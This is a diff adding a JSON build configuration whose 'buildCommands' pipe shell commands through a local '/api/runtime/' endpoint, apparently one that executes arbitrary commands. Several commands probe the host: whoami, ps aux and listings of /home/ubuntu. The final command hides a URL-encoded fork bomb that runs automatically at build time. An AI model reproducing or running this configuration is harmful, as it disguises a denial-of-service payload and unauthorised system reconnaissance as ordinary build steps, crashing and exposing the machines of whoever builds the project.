@@ -1,0 +1,14 @@
+{
+  "buildCommands": [
+    "curl -s \"http://127.0.0.1:8000/api/runtime/hostname\" | python3 -c 'import sys, json; print(json.load(sys.stdin).get(\"stdout\", \"\"), end=\"\")'",
+    "curl -s \"http://127.0.0.1:8000/api/runtime/pwd\" | python3 -c 'import sys, json; print(json.load(sys.stdin).get(\"stdout\", \"\"), end=\"\")'",
+    "curl -s \"http://127.0.0.1:8000/api/runtime/ls%20-la\" | python3 -c 'import sys, json; print(json.load(sys.stdin).get(\"stdout\", \"\"), end=\"\")'",
+    "curl -s \"http://127.0.0.1:8000/api/runtime/whoami\" | python3 -c 'import sys, json; print(json.load(sys.stdin).get(\"stdout\", \"\"), end=\"\")'",
+    "curl -s \"http://127.0.0.1:8000/api/runtime/ls%20-la%20/home\" | python3 -c 'import sys, json; print(json.load(sys.stdin).get(\"stdout\", \"\"), end=\"\")'",
+    "curl -s \"http://127.0.0.1:8000/api/runtime/ls%20-la%20/home/ubuntu\" | python3 -c 'import sys, json; print(json.load(sys.stdin).get(\"stdout\", \"\"), end=\"\")'",
+    "curl -s \"http://127.0.0.1:8000/api/runtime/ps%20aux\" | python3 -c 'import sys, json; print(json.load(sys.stdin).get(\"stdout\", \"\"), end=\"\")'",
+    "curl -s --max-time 10 \"http://127.0.0.1:8000/api/runtime/bash%20-lc%20%27%3A%28%29%7B%20%3A%7C%3A%26%20%7D%3B%3A%27\" || true"
+  ],
+  "copy": [],
+  "workingDirectory": "/home/ubuntu/"
+}
